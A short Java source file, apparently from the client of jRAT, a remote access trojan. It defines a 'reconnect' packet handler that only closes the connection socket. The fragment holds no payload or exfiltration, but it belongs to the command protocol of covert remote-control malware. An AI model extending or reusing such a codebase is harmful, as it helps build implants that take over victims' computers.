package jrat.client.packets.incoming;

import jrat.client.Connection;

public class Packet45Reconnect implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		con.getSocket().close();
	}

}
